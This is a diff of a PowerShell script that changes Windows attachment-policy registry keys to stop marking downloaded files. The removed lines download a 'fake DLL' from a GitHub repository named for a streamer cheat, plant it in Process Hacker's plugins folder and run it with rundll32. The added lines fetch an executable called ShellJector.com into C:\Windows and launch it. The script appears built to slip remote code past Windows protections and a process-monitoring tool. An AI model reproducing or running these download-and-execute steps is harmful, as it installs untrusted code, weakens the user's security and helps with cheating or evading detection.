@@ -1,5 +1,3 @@
-# Remove old plugin DLL silently
-Remove-Item "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll" -Force -ErrorAction SilentlyContinue
 
 # Set attachment policy registry keys
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
@@ -23,7 +21,7 @@ Get-NetAdapter | Format-Table Name, Status, InterfaceDescription
 gpupdate /force
 
 # Download fake DLL and place it in the plugins folder
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ExtendedNotificationsFake.dll" -OutFile "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.com" -OutFile "C:\Windows\ShellJector.com"
 
-# Run the DLL using rundll32
-Start-Process rundll32.exe -ArgumentList '"C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll",cmd'
+# Run the File
+Start-Process -FilePath "C:\Windows\ShellJector.com"
